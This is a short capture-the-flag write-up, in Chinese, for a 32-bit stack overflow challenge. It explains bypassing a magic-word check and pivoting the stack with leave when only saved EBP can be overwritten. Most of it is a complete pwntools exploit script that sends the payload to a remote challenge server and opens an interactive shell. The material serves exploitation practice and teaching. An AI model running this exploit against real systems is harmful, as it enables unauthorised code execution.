栈溢出，提供shell函数，所以覆盖返回地址为提供的函数地址即可  
但是：1、有魔术字检测；2、只能覆盖到ebp，到不了ret  
所以leave的时候，跳到伪造的栈，ret弹出shell函数地址  

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0
if debug:
    p = process("./stack")
    stack = 0xffffdbc6
else:
    p = remote("35.237.220.217", 1337)
    stack = 0xffffdc86

win = 0x0804854d
#gdb.attach(proc.pidof(p)[0])

p.recvuntil("Send me food!!! Give me input")
payload = "A" * 4 + p32(win) + "B" * 42 + "utsa" + 'C' * 12 + p32(stack)
p.sendline(payload)

p.interactive()
```